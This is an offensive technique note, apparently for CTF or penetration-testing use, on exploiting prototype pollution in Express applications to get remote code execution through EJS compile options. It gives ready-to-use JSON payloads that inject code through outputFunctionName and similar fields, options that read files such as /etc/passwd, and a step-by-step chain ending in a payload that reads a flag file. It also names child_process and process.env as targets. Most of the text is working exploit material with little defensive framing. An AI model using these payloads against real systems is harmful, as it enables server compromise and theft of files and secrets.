# EJS gadgets — the template-compile path to RCE

EJS is the prototype-pollution payoff engine: its `compile` step turns
OPTION FIELDS into generated code. Pollute an option that lands in the
generated function and you have RCE when the template renders.

---

## 1. How EJS compiles — the three fields that matter

EJS's `compile(template, opts)` builds a JS function by string
concatenation. Three option fields land inside that string:

```js
// ejs/lib/ejs.js — the generation, simplified
var fn = new Function(
  opts.localsName + ', escapeFn, include, rethrow',
  'var ' + opts.outputFunctionName + ' = [];' +   // ← the name
  '...generated body...' +
  'return ' + opts.outputFunctionName + ".join('');"
);
```

| Option | Default | Where it lands |
|---|---|---|
| `outputFunctionName` | `__append` | the buffer-push function name — raw JS |
| `localsName` | `locals` | the first param name — raw JS |
| `escape`/`escapeFunction` | XML-escaper | the escaper identity — function ref |
| `destructureLocals` | `[]` | names destructured from locals — raw JS |
| `delimiter`/`_with`/`client`/`compileDebug` | various | code-path switches |

`outputFunctionName` and `destructureLocals` are raw-string injections
into `new Function` — the Chromatic gadget.

## 2. The Chromatic primitive (confirmed)

```json
{"theme": {"constructor": {"prototype":
  {"outputFunctionName": "x;__append('[PP-MARKER]');var y"}}}}
```

The generated code becomes `var x;__append('[PP-MARKER]');var y = []`
— the statement boundary `;` closes the `var`, the injected code runs
inside the generated function on EVERY render, `var y` completes the
expected name so the function still parses.

The marker-then-code pattern: `__append('[PP-MARKER]')` first — a
harmless payload that proves the generated code ran — then the real
payload (`require('fs').readFileSync('/flag')`, `process.env`, a
`child_process` call).

## 3. The full option corpus

```json
{"outputFunctionName": "x;CODE;var y"}
{"localsName": "a);CODE;(function(b"}
{"destructureLocals": ["x;CODE;var y"]}
{"escapeFunction": "function(x){return CODE()}"}   — string→eval paths
{"escape": "x;CODE;var y"}
{"delimiter": "?"}
{"openDelimiter": "<"}
{"closeDelimiter": ">"}
{"client": true}
{"compileDebug": true}
{"debug": true}
{"strict": true}
{"rmWhitespace": true}
{"root": "/etc"}
{"views": ["/etc"]}
{"filename": "/etc/passwd"}
{"context": {"x":1}}
{"cache": true}
{"async": true}
{"_with": true}
```

`root`/`views`/`filename` don't run code directly — they point the
file resolution: `filename: "/etc/passwd"` renders that file AS an EJS
template (file-read primitive, plus `<%= %>` evaluation of its
content). `root`/`views` change where `include` looks.

## 4. The render-time triggers

Pollution lands on the OPTIONS object; the code runs when a template
is compiled. Compile triggers:

- every `res.render('page', ...)` — if `view cache` is off
  (development mode), EVERY request recompiles
- `ejs.renderFile(path, data, opts)` — the opts may merge `app.locals`
  or a polluted settings object
- `app.engine('ejs', ...)` — the engine call itself
- a custom render path that builds `ejs.compile(tpl, mergedOpts)`
  where `mergedOpts` includes your polluted keys

The options source chain is the part that matters:
`opts = _.merge({}, app.get('view options'), req.opts)` — your
pollution of `Object.prototype` supplies `view options` keys the app
never set.

## 5. The `app.locals`/`view options` channel

`app.locals` is a persistent object merged into every render's data
AND options on some express-ejs setups. Polluting it means every
render sees your keys. `app.set('view options', {...})` is the static
equivalent — the merge target.

## 6. Other EJS-adjacent sinks

- **`<%= %>` evaluation**: not pollution — SSTI. EJS evaluates
  `<%= expr %>` — a stored template field is the SSTI path.
- **`include` resolution**: `root`/`filename` pollution reads files —
  `<%- include('/etc/passwd') %>` needs the file read first.
- **`escapeFunction`**: replacing the escaper leaves unescaped
  output — stored XSS rather than RCE, on engines that call
  `opts.escapeFunction` per value.

## 7. The verification chain

```bash
# 1. the write reaches a merge
POST /api/settings {"theme":{"__proto__":{"m":"pp"}}}
# 2. a fresh object carries it
GET /api/other → {"m":"pp",...}
# 3. the sink: pollute outputFunctionName with the marker
{"theme":{"constructor":{"prototype":{"outputFunctionName":
 "x;__append('[PP]');var y"}}}}
# 4. trigger a render — the marker appears in HTML
GET /rendered-page → "[PP]<!doctype html>..."
# 5. the real payload — flag read
"outputFunctionName":
 "x;__append(require('fs').readFileSync('/flag','utf8'));var y"
```

## 8. Denial shapes

- `outputFunctionName` never reaches `new Function` — a hardened EJS
  (≥3.1.10 has the fix in some forks) or a template compiled once at
  boot (view cache on in production — re-pollution has no recompile
  to hit).
- The `theme` object is validated against a schema — unknown keys
  dropped.
- `new Function` itself is blocked (rare CSP-adjacent hardening).
- The polluted option lands but the generated code fails to parse —
  a 500 on render. Your payload broke the syntax — the `x;...;var y`
  bookend matters: `var y` must complete the name.
